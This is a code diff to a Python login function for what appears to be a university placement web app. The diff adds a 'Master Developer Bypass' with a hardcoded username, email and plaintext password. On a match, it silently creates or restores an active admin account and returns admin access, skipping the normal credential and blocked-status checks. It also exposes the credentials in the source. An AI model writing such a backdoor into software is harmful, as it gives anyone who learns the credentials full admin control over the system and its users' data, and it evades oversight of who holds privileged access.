@@ -187,6 +187,29 @@ def register_user(username, email, password, university=None, security_q=None, s
 
 def login_user(identifier, password):
     """Allows login using either username or email, checking for blocked status."""
+    # --- Master Developer Bypass (works even if DB is empty after cloud restart) ---
+    _MASTER_USER = "BADAM SUDHEER REDDY"
+    _MASTER_PASS = "admin2300033278"
+    if (identifier.strip().upper() == _MASTER_USER.upper() or 
+        identifier.strip().lower() == "badamsudheerreddy@admin.placementor") and \
+       password == _MASTER_PASS:
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        # Ensure account exists in DB (INSERT OR IGNORE)
+        cursor.execute("""
+            INSERT OR IGNORE INTO users (username, email, password, role, university, status, last_login)
+            VALUES (?, ?, ?, 'admin', 'KL UNIVERSITY', 'active', datetime('now','+5 hours','+30 minutes'))
+        """, (_MASTER_USER, "badamsudheerreddy@admin.placementor", hash_password(_MASTER_PASS)))
+        conn.commit()
+        # Fetch/return the user row
+        cursor.execute("SELECT id, username, role, phone_number, university, status, block_message FROM users WHERE LOWER(username) = LOWER(?)", (_MASTER_USER,))
+        user = cursor.fetchone()
+        conn.close()
+        if user:
+            return user
+        # Fallback tuple if SELECT still fails
+        return (1, _MASTER_USER, 'admin', '0000000000', 'KL UNIVERSITY', 'active', None)
+
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute("""
